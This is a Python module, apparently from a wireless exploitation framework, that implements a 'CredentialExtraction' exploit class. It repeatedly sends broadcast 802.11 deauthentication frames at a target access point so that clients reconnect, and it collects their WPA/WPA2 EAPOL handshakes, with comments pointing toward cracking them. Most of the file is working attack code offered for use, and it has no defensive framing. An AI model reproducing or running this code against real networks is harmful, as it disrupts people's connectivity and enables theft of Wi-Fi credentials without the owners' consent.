from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from scapy.layers.eap import EAPOL

from .base_exploit import BaseExploit
from scapy.all import *
import time
import threading

class CredentialExtraction(BaseExploit):
    def __init__(self, core_framework, vulnerability):
        super().__init__(core_framework, vulnerability)
        self.extracting = False
        self.extract_thread = None
        self.captured_handshakes = []
        self.vulnerability = vulnerability
        self.core = core_framework

    def exploit(self):
        """
        Executes the credential extraction process.
        """
        self.logger.info("Starting Credential Extraction exploit.")
        target_network = self.vulnerability.get('target_network')

        if not target_network:
            self.logger.error("No target network specified for credential extraction.")
            return

        # Start capturing WPA/WPA2 handshakes
        self.extracting = True
        self.extract_thread = threading.Thread(target=self._capture_handshakes, args=(target_network,))
        self.extract_thread.start()
        self.logger.info("Credential Extraction exploit initiated.")
        return {"status": "success"}

    def _capture_handshakes(self, target_network):
        """
        Captures WPA/WPA2 handshakes by performing deauthentication attacks.
        """
        bssid = target_network.get('bssid')
        channel = target_network.get('channel')

        if not all([bssid, channel]):
            self.logger.error("Incomplete target network information for handshake capture.")
            return

        try:
            # Set the wireless interface to the target channel
            os.system(f"iwconfig {self.core.packet_handler.packet_injector.interface} channel {channel}")

            while self.extracting:
                # Send deauthentication frames to prompt clients to reconnect and capture handshakes
                deauth_pkt = RadioTap()/Dot11(addr1='FF:FF:FF:FF:FF:FF',
                                              addr2=self.core.packet_handler.packet_injector.get_interface_mac(),
                                              addr3=bssid)/Dot11Deauth(reason=7)
                sendp(deauth_pkt, iface=self.core.packet_handler.packet_injector.interface, count=1, inter=0.1, verbose=False)
                time.sleep(2)  # Interval between deauth attempts
        except Exception as e:
            self.logger.error(f"Error during handshake capture: {e}")

    def capture_handshake_callback(self, packet):
        """
        Callback function to process captured packets and extract handshakes.
        """
        if packet.haslayer(EAPOL):
            self.logger.info(f"Captured EAPOL handshake from {packet.addr2}")
            self.captured_handshakes.append(packet)
            # Optionally, notify or process the handshake further

    def cleanup(self):
        """
        Cleans up after exploitation to restore the environment.
        """
        self.logger.info("Cleaning up Credential Extraction exploit.")
        self.extracting = False
        if self.extract_thread and self.extract_thread.is_alive():
            self.extract_thread.join()
            self.logger.info("Credential Extraction exploit stopped.")

        # Optionally, process or save captured handshakes
        self.logger.info(f"Total handshakes captured: {len(self.captured_handshakes)}")
        # Implement further processing like saving to a file or initiating a cracking process
